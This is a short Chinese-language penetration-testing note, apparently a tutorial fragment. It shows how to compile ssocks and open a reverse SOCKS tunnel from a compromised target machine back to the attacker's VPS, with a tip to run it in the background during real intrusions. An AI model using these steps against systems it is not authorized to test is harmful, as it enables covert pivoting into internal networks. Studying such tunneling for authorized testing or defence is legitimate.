./configure && make && make install

先在本地机器上执行,一般都是你自己的vps,如果开了防火墙记得把该端口放开:
 rcsocks -l 1234 -p 1080 -vv
 
 到目标机器上执行[自带台运行选项,实际渗透中可以把它加上]:
 rssocks -s  192.168.3.41(实际中可能是你vps的ip):1080 -vv
